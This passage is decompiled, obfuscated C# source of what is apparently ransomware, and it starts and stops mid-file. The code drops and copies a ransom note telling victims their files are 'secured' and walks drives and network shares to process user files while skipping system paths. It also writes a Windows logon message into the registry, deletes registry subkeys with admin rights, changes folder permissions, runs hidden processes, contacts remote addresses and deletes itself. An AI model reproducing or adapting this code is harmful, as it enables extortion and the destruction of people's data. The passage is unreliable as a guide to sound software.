					streamWriter.WriteLine(getString_0(107396509));
					streamWriter.WriteLine(UwCpksGCJZfb(getString_0(107409067)));
					streamWriter.WriteLine(SYJrybFSgaPzO.AaOvZSRLQs());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088));
				if (!text11.Contains(QGCgJoxiimxbWS) && !aeWIyHaDtadg)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088), getString_0(107409034) + QGCgJoxiimxbWS);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in aJxBDYqKswV)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107411088)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088), item + getString_0(107411088), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088));
					if (!text12.Contains(QGCgJoxiimxbWS) && !aeWIyHaDtadg)
					{
						File.AppendAllText(item + getString_0(107411088), getString_0(107409034) + QGCgJoxiimxbWS);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!RgoefyjRKB && num > 10)
			{
				break;
			}
		}
		if (HbPrFXeRvEJlR == getString_0(107396742))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107409517)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107409517));
					streamWriter2.WriteLine(UwCpksGCJZfb(getString_0(107409476)));
					streamWriter2.WriteLine(getString_0(107396509));
					streamWriter2.WriteLine(UwCpksGCJZfb(getString_0(107408150)));
					streamWriter2.WriteLine(QGCgJoxiimxbWS + UwCpksGCJZfb(getString_0(107408061)));
					if (ABcQQsWptXmkku == getString_0(107396999))
					{
						streamWriter2.WriteLine(getString_0(107396509));
						streamWriter2.WriteLine(UwCpksGCJZfb(getString_0(107408080)) + UwCpksGCJZfb(getString_0(107409112)) + Convert.ToString(usKuKFlfRGo.Count) + UwCpksGCJZfb(getString_0(107408061)));
					}
					if (rCIcEDqTdpw)
					{
						streamWriter2.WriteLine(getString_0(107396509));
						streamWriter2.WriteLine(UwCpksGCJZfb(getString_0(107409067)));
						streamWriter2.WriteLine(SYJrybFSgaPzO.AaOvZSRLQs());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088));
					if (!text13.Contains(QGCgJoxiimxbWS) && !aeWIyHaDtadg)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107409517), UwCpksGCJZfb(getString_0(107408080)) + getString_0(107409034) + QGCgJoxiimxbWS + UwCpksGCJZfb(getString_0(107408061)));
					}
				}
			}
			catch
			{
			}
		}
		if (xQSfdowgAngWtM == getString_0(107396742))
		{
			try
			{
				if (ABcQQsWptXmkku == getString_0(107396999))
				{
					SYJrybFSgaPzO.xcRMBpaQVPnOJtxY(getString_0(107408019), getString_0(107408014), getString_0(107408481), string.Concat(UwCpksGCJZfb(getString_0(107396575)), new WebClient().DownloadString(UwCpksGCJZfb(getString_0(107396582))), getString_0(107408472), UwCpksGCJZfb(getString_0(107396504)), DateTime.Now, getString_0(107396509), UwCpksGCJZfb(getString_0(107408499)), Convert.ToString(usKuKFlfRGo.Count), getString_0(107396509), UwCpksGCJZfb(getString_0(107396495)), QGCgJoxiimxbWS));
				}
				else
				{
					SYJrybFSgaPzO.xcRMBpaQVPnOJtxY(getString_0(107408019), getString_0(107408014), getString_0(107408481), string.Concat(UwCpksGCJZfb(getString_0(107396575)), new WebClient().DownloadString(UwCpksGCJZfb(getString_0(107396582))), getString_0(107408472), UwCpksGCJZfb(getString_0(107396504)), DateTime.Now, getString_0(107396509), UwCpksGCJZfb(getString_0(107408499)), Convert.ToString(usKuKFlfRGo.Count), getString_0(107396509), UwCpksGCJZfb(getString_0(107396495)), QGCgJoxiimxbWS));
				}
			}
			catch
			{
			}
		}
		if (kzweLPCpTA == getString_0(107396742))
		{
			try
			{
				OOIHZBAIMbPRZ.OKGWuQOXnzia(new Uri(getString_0(107408418)));
			}
			catch
			{
			}
		}
		if (HbPrFXeRvEJlR == getString_0(107396999))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088)))
				{
					Process.Start(UwCpksGCJZfb(getString_0(107408417)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411088));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107409517)))
				{
					Process.Start(UwCpksGCJZfb(getString_0(107408424)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107409517));
				}
			}
			catch
			{
			}
		}
		if (GpdHiVWCHuSiS == getString_0(107396742))
		{
			if (rAaEXIinkLiOSN == getString_0(107396742) && !string.IsNullOrEmpty(fuejbDskEjJiZ) && !string.IsNullOrEmpty(pGvUNugSZbPk))
			{
				XjYBjbnaZXMf(fuejbDskEjJiZ, pGvUNugSZbPk);
			}
			else
			{
				XjYBjbnaZXMf(getString_0(107408375), getString_0(107408346));
			}
		}
		if (wVVmqrdGeUXsjzM != getString_0(107407720))
		{
			YFluhefxNNABOJ(wVVmqrdGeUXsjzM);
		}
		if (!string.IsNullOrEmpty(vHKKlZoghg))
		{
			try
			{
				File.Delete(vHKKlZoghg);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(KymHhFbNcwDYA, getString_0(107407671) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (LbhjvcCDDsZLYlccs)
		{
			try
			{
				File.AppendAllText(KymHhFbNcwDYA, getString_0(107407658));
			}
			catch (Exception)
			{
			}
		}
		if (uIpYqEvOzPpeD == getString_0(107407613))
		{
			rekpnonBnDwKB();
		}
	}

	public static void TcCpmTjIUhoTdaWUI()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(UwCpksGCJZfb(getString_0(107407604)), UwCpksGCJZfb(getString_0(107408375)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int xJxBRgJwtfLMmm(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> rffAcjefKKM(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107407962)) && !text.Contains(getString_0(107407937)) && !text.Contains(getString_0(107407904)) && !text.ToLower().Contains(getString_0(107407919)) && !text.ToLower().Contains(getString_0(107407874)) && !text.Contains(getString_0(107407881)) && !text.Contains(getString_0(107407828)) && !text.ToLower().Contains(getString_0(107407847)) && !text.ToLower().Contains(getString_0(107407802)) && !text.ToLower().Contains(getString_0(107407765)) && !text.ToLower().Contains(getString_0(107407788)) && !text.ToLower().Contains(getString_0(107407739)) && !text.ToLower().Contains(getString_0(107407758)) && !text.ToLower().Contains(getString_0(107407201)) && !text.ToLower().Contains(getString_0(107407212)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107407187)) && !fileInfo.FullName.Contains(getString_0(107407138)) && !fileInfo.FullName.Contains(getString_0(107407153)) && !fileInfo.FullName.Contains(getString_0(107407104)) && !fileInfo.FullName.Contains(getString_0(107407119)) && !fileInfo.FullName.Contains(getString_0(107407070)) && !fileInfo.FullName.Contains(getString_0(107407085)) && !fileInfo.FullName.Contains(getString_0(107407036)) && !fileInfo.FullName.Contains(getString_0(107407055)) && !fileInfo.FullName.Contains(getString_0(107407002)) && !fileInfo.FullName.ToLower().Contains(getString_0(107407021)) && !fileInfo.FullName.ToLower().Contains(getString_0(107406976)) && !fileInfo.FullName.ToLower().Contains(getString_0(107406991)) && !fileInfo.FullName.ToLower().Contains(getString_0(107407454)) && !fileInfo.FullName.Contains(UwCpksGCJZfb(getString_0(107407469))) && !fileInfo.FullName.Contains(getString_0(107407412)) && !fileInfo.FullName.Contains(getString_0(107397139)) && !fileInfo.FullName.Contains(getString_0(107407431)) && !fileInfo.FullName.EndsWith(getString_0(107411094)) && !fileInfo.FullName.EndsWith(getString_0(107407398)) && !fileInfo.FullName.EndsWith(getString_0(107407361)) && !fileInfo.FullName.EndsWith(getString_0(107407356)) && !fileInfo.FullName.EndsWith(getString_0(107407351)) && !fileInfo.FullName.Contains(getString_0(107407378)) && !fileInfo.FullName.Contains(kcoCbafUQcNu) && !fileInfo.FullName.Contains(KymHhFbNcwDYA) && !fileInfo.FullName.Contains(DNnNiXPlebeA))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(usPuVjNWIMFCfzm) * 1024.0 * 1024.0 && gXRstoeNfSB == getString_0(107396742))
						{
							list.Add(fileInfo.FullName);
							IKahjOdTppjZS(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && gXRstoeNfSB == getString_0(107396999))
						{
							list.Add(fileInfo.FullName);
							IKahjOdTppjZS(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void JeaXEVaVnVlURf()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107407329));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!OtDxRoGRan.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107407308), getString_0(107397112)).Replace(getString_0(107407303), getString_0(107407308))
					.Replace(getString_0(107407262), getString_0(107408418))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					OtDxRoGRan.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107407308), getString_0(107397112)).Replace(getString_0(107407303), getString_0(107407308))
						.Replace(getString_0(107407262), getString_0(107408418))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107407257), getString_0(107408418)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string eZjDlpokwsIwI(string qGIKvUVqihGUg = "", string SRQWniUWAHIPr = "")
	{
		string result = getString_0(107408418);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = qGIKvUVqihGUg,
				Arguments = SRQWniUWAHIPr,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void drBNsNInWsZxiDt(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107407280),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string krZwaVuuJwBahD(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string UwCpksGCJZfb(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void MZyhCvSZMIQE(string JsgyWaCHAEZF = "", string pHbzOzqZtli = "SW5mb3JtYXRpb24uLi4=", string KJqTJssRlzqfbBo = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		JsgyWaCHAEZF = krZwaVuuJwBahD(getString_0(107407231));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(JsgyWaCHAEZF), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UwCpksGCJZfb(getString_0(107406622)), UwCpksGCJZfb(pHbzOzqZtli));
				registryKey.SetValue(UwCpksGCJZfb(getString_0(107406589)), UwCpksGCJZfb(KJqTJssRlzqfbBo));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			JsgyWaCHAEZF = krZwaVuuJwBahD(getString_0(107406560));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(JsgyWaCHAEZF), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UwCpksGCJZfb(getString_0(107406455)), UwCpksGCJZfb(pHbzOzqZtli));
				registryKey.SetValue(UwCpksGCJZfb(getString_0(107406934)), UwCpksGCJZfb(KJqTJssRlzqfbBo));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void JiwsVJMEwtLHxu()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (rAaEXIinkLiOSN == getString_0(107396742) && !string.IsNullOrEmpty(fuejbDskEjJiZ) && !string.IsNullOrEmpty(pGvUNugSZbPk))
				{
					MZyhCvSZMIQE(getString_0(107408418), fuejbDskEjJiZ, pGvUNugSZbPk);
				}
				else
				{
					MZyhCvSZMIQE(getString_0(107408418), getString_0(107408375), getString_0(107408346));
				}
			}
		}
		catch
		{
		}
	}

	public static void XjYBjbnaZXMf(string UkRQwfoxTMKhhj = "SW5mb3JtYXRpb24uLi4=", string lENkctkcPZhp = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(UwCpksGCJZfb(UkRQwfoxTMKhhj));
		val.set_BalloonTipText(UwCpksGCJZfb(lENkctkcPZhp));
		val.ShowBalloonTip(30000);
	}

	public static void YFluhefxNNABOJ(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107406905)), getString_0(107406920) + text + getString_0(107406879) + string_0);
	}

	private static void obggDVdAhf()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		JEOoMtOSCqfY();
		List<ODxvcVkvIHdhUDZa> list = ODxvcVkvIHdhUDZa.lnfLSxvCPvskIae();
		foreach (ODxvcVkvIHdhUDZa item in list)
		{
			MIMunWsuizdBMds.Add(item.IPAddress);
		}
		List<string> mIMunWsuizdBMds = MIMunWsuizdBMds;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
			{
				diMjuCNLxzH CS_0024_003C_003E8__locals0 = new diMjuCNLxzH();
				CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA = string_0;
				if ((!CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404084)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404111)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404102)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107408418))) || !cyikEDwiTbqA.UjKDIhJqGQpCr(CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA))
				{
					return;
				}
				try
				{
					Thread.Sleep(SlKkhSsDvLYM);
					OtDxRoGRan.Add(getString_0(107407308) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + getString_0(107404057));
					try
					{
						if (IebLDrmorstxvf)
						{
							Console.WriteLine(getString_0(107407308) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + getString_0(107404057));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(SlKkhSsDvLYM);
						OtDxRoGRan.Add(diMjuCNLxzH.getString_0(107407314) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + diMjuCNLxzH.getString_0(107397118) + (char)int_0 + diMjuCNLxzH.getString_0(107356543));
						try
						{
							if (IebLDrmorstxvf)
							{
								Console.WriteLine(diMjuCNLxzH.getString_0(107407314) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + diMjuCNLxzH.getString_0(107397118) + (char)int_0 + diMjuCNLxzH.getString_0(107356543));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(mIMunWsuizdBMds, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
		try
		{
			cyikEDwiTbqA.jqKrQsieplGYt jqKrQsieplGYt = new cyikEDwiTbqA.jqKrQsieplGYt(cyikEDwiTbqA.QwYtjgVURDeNeO.RkwFoCRJVE, cyikEDwiTbqA.ijoGwZQeDWh.mlxsYcFDnddvv, cyikEDwiTbqA.EDSutSLlbNZTTp.UjMasxomcTAoeR, cyikEDwiTbqA.uRjKdagvrpG.wnmrAAhFUIgvZC);
			foreach (string item2 in jqKrQsieplGYt)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107406874));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!OtDxRoGRan.Contains(item3.ToString()))
						{
							OtDxRoGRan.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (IebLDrmorstxvf)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		trzEGBFWWkP.lQjELCoROYSjjF();
		try
		{
			if (IebLDrmorstxvf)
			{
				Console.WriteLine(getString_0(107406825));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = krZwaVuuJwBahD(getString_0(107406560));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(UwCpksGCJZfb(getString_0(107406752)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(UwCpksGCJZfb(getString_0(107406727)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (uCWDfzwsOhcHb == getString_0(107396742))
		{
			hFBfnpUAtHRB.mEBSTVfARXeb();
		}
		try
		{
			if (IebLDrmorstxvf)
			{
				Console.WriteLine(getString_0(107406138));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107407329));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (OtDxRoGRan.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107407308), getString_0(107397112)).Replace(getString_0(107407303), getString_0(107407308))
					.Replace(getString_0(107407262), getString_0(107408418))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (IebLDrmorstxvf)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107407308), getString_0(107397112)).Replace(getString_0(107407303), getString_0(107407308))
							.Replace(getString_0(107407262), getString_0(107408418))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107407257), getString_0(107408418)));
					}
				}
				catch
				{
				}
				OtDxRoGRan.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107407308), getString_0(107397112)).Replace(getString_0(107407303), getString_0(107407308))
					.Replace(getString_0(107407262), getString_0(107408418))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107407257), getString_0(107408418)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (IebLDrmorstxvf)
			{
				Console.WriteLine(getString_0(107406081));
			}
		}
		catch
		{
		}
	}

	public static bool rHABtcOkWFsPkpgF()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107406012));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void QcdyUTbkpEHyhuof(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = UwCpksGCJZfb(getString_0(107405979));
		processStartInfo.Arguments = getString_0(107405950) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool MknoxGcvnLujD(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ROkMwyKYEzSqR(string string_0)
	{
		try
		{
			bBRpyIYYXJa CS_0024_003C_003E8__locals0 = new bBRpyIYYXJa();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.JJLjDBNMgJ = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.JJLjDBNMgJ);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107405945);
		}
		catch
		{
			return false;
		}
	}

	public static void nSIwblfbixJB()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = krZwaVuuJwBahD(getString_0(107405968));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406342)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406317)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406268)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406243)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107405979)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406250)));
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107406905)));
					registryKey.Close();
				}
				string_ = krZwaVuuJwBahD(getString_0(107406221));
				registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107405612)));
					registryKey.Close();
				}
				string_ = krZwaVuuJwBahD(getString_0(107405563));
				registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107405612)));
					registryKey.Close();
				}
				string_ = krZwaVuuJwBahD(getString_0(107405563));
				registryKey = Registry.CurrentUser.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UwCpksGCJZfb(getString_0(107405612)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405578)), UwCpksGCJZfb(getString_0(107405529)));
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405512)), UwCpksGCJZfb(krZwaVuuJwBahD(getString_0(107405471))));
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405512)), UwCpksGCJZfb(getString_0(107405869)));
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405808)), UwCpksGCJZfb(getString_0(107405759)));
		}
		catch
		{
		}
	}

	public static void fowJyXOiDyhEY(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(UwCpksGCJZfb(getString_0(107405686)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void POrHHaqaAd()
	{
		string string_ = krZwaVuuJwBahD(getString_0(107405149));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UwCpksGCJZfb(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UwCpksGCJZfb(getString_0(107405100)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void JEOoMtOSCqfY()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405067)), UwCpksGCJZfb(getString_0(107405022)));
			eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107405067)), UwCpksGCJZfb(getString_0(107405404)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string nioDFVnHCKMKDq(string BJcBFtQLqVuOf, int knyNLXEFLXbqD = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(knyNLXEFLXbqD);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(BJcBFtQLqVuOf, 1, intPtr, ref knyNLXEFLXbqD) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void rekpnonBnDwKB()
	{
		eZjDlpokwsIwI(getString_0(107396248), UwCpksGCJZfb(getString_0(107405290)));
		string text = UwCpksGCJZfb(getString_0(107404584));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107407262) + text + getString_0(107407262) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396248);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void JQZzLwKsZGVNU(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(KymHhFbNcwDYA, getString_0(107404519) + string_0 + getString_0(107404478) + ex.Message + getString_0(107396509));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string GzujaRTNkzjcu()
